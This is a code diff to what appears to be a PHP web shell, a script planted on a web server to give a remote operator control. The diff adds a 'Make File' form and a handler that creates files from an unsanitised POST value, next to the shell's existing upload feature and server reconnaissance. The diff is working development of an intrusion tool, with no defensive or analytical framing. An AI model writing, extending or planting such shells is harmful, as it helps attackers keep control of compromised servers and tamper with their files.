@@ -48,6 +48,25 @@ $cwd = posix_getcwd();
 $free_disk_space = disk_free_space("/");
 $total_disk_space = disk_total_space("/");
 
+if (isset($_POST["mk_file"]))
+{
+	if (is_writable($cwd))
+	{
+		if (!file_exists($cwd . "/" . $_POST["mk_file"]))
+		{
+			$result_mk_f = (touch($_POST["mk_file"])) ? "[+] success: file created" : "[-] error: file not created";
+		}
+		else
+		{
+			$result_mk_f = "[-] error: file already exists";
+		}
+	}
+	else
+	{
+		$result_mk_f = "[-] error: folder not writable";
+	}
+}
+
 if (isset($_FILES["upload"]))
 {
 	$target_directory = $cwd;
@@ -352,6 +371,13 @@ if ($cwd)
 	<?php
 }
 ?>
+
+<form action="<? echo($shell); ?>" method="POST">
+	<input type="text" id="mk_file" name="mk_file" placeholder="file.tmp" required>
+	<input type="submit" value="Make File">
+</form>
+
+<?php if (isset($result_mk_f)) { show_alert($result_mk_f); } ?>
 
 <form action="<? echo($shell); ?>" method="POST" enctype="multipart/form-data">
 	<label for="upload">File:</label>
